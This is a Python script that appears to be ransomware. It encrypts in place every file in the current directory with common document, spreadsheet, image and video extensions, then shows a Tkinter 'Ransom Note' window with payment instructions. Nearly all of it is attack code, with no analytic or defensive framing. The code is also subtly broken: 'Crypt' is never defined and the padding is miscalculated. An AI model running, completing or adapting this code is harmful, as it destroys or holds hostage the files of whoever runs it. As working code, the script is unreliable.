import os
import sys
import socket
import random
import hashlib
import base64
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk

# Hardcoded encryption and decryption keys
ENCRYPTION_KEY = 'mrdirweb33lizscriptkiddle'

# Main payload
def execute_payload():
    # Encryption process
    encrypt_files()
    # Infection simulation
    print("Simulating infection... [COMPLETE]")

def encrypt_files():
    # Iterate through all files in the current directory
    for file_name in os.listdir():
        # Check if file matches targeted file extensions
        _, file_ext = os.path.splitext(file_name)
        if file_ext in ['.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.jpg', '.png', '.jpeg', '.mp4']:
            # Read file content
            with open(file_name, 'rb') as file:
                content = file.read()
            # Encrypt content
            encrypted_content = encrypt_content(content)
            # Write encrypted content to file
            with open(file_name, 'wb') as file:
                file.write(encrypted_content)

def encrypt_content(content):
    # Generate random initialization vector (IV)
    iv = os.urandom(16)

    # Generate encryption key
    encryption_key = generate_key(ENCRYPTION_KEY)
    # Perform AES encryption
    encryptor = Crypt.encryptor(encryption_key, iv)

    # Padding content
    padding = 17 - len(content) % 16
    content_padded = content + padding * chr(padding).encode()

    # Perform AES encryption
    encrypted_content = encryptor.update(content_padded) + encryptor.finalize()
    # Base64 encode the encrypted content + IV
    encrypted_and_iv = base64.b64encode(encrypted_content + iv)

    return encrypted_and_iv

def generate_key(key):
    # Generate SHA-256 hash of the hardcoded encryption key
    sha256 = hashlib.sha256()
    sha256.update(key.encode())

    # Return SHA-256 hash as the encryption key
    return sha256.digest()

# Ransom note GUI
def create_ransom_note():
    # Check if ransom_note.png exists in the same directory
    if os.path.exists("ransom_note.png"):
        # Create the main window
        root = tk.Tk()
        root.title("Ransom Note")

        # Load ransom note image
        ransom_note_image = Image.open("ransom_note.png")
        ransom_note_image_resized = ransom_note_image.resize((600, 400))
        ransom_note_photo = ImageTk.PhotoImage(ransom_note_image_resized)

        # Create a label to display the ransom note image
        ransom_note_label = ttk.Label(root, image=ransom_note_photo)
        ransom_note_label.pack(pady=20)

        # Create a label to display the decryption key
        decryption_key_label = ttk.Label(root, text="Decryption Key: mrdirweb33lizscriptkiddle")
        decryption_key_label.pack()

        # Create a label to display the payment instructions
        payment_instructions_label = ttk.Label(root, text="Follow the instructions on the screen to pay the ransom and decrypt your files.")
        payment_instructions_label.pack()

        # Create a button to close the ransom note
        close_button = ttk.Button(root, text="Close", command=root.destroy)
        close_button.pack(pady=20)

        # Run the ransom note GUI
        root.mainloop()
    else:
        print("Ransom note image not found.")

# Entry point
if __name__ == '__main__':
    execute_payload()
    create_ransom_note()
